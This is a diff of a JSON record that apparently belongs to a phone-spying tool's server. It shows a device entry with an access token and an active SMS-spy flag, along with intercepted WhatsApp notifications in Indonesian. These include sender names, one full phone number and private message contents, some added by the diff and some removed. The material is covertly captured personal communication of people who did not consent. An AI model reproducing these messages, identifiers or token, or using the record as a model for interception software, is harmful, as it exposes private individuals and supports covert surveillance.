@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776942710696,
+    "lastSeen": 1776942713780,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,54 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 823-1199-7104",
+        "content": "Balik sore kmr16 kemarin aku kasih di kmr17",
+        "time": "23/04 19:11",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776942714163
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Maya",
+        "content": "aku tadi pas dibilang jangan chat ga aku chat",
+        "time": "23/04 19:11",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776942714121
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Muhammad Amal Ardhafan",
+        "content": "Semangat ma disana",
+        "time": "23/04 19:11",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776942713928
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎57 pesan dari 36 chat",
+        "time": "23/04 19:11",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776942713784
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎57 pesan dari 36 chat",
+        "time": "23/04 19:11",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776942713423
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎57 pesan dari 36 chat",
+        "time": "23/04 19:11",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776942713175
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -3971,54 +4019,6 @@
         "time": "23/04 11:06",
         "pkg": "com.whatsapp",
         "receivedAt": 1776913568949
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎Oi (6 pesan): prily 🤍",
-        "content": "EH",
-        "time": "23/04 11:05",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776913555080
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎Oi (6 pesan): Membalas Anda",
-        "content": "prily 🤍: PA MAKSUD",
-        "time": "23/04 11:05",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776913554746
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "prily 🤍",
-        "content": "🎤 Pesan suara (0.06)",
-        "time": "23/04 11:05",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776913554686
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎73 pesan dari 41 chat",
-        "time": "23/04 11:05",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776913554405
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎Oi (6 pesan): Membalas Anda",
-        "content": "Bot Gc: 💟 Stiker",
-        "time": "23/04 11:05",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776913554323
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎Oi (6 pesan): Membalas Anda",
-        "content": "Bot Gc: 📷 𐔈⃘ ֹ ׅ 🍓 ֹ Brat Generator ֹ ׅ ୫\n╭╼─┈───┈──⏣╼╯\n┆✿᪲ ׄ𖹭₊ Teks : ayuu jelekkkkkk\n╰─╼𔕬─┈───┈───┈",
-        "time": "23/04 11:05",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776913553851
       }
     ],
     "galleryPhotos": [],
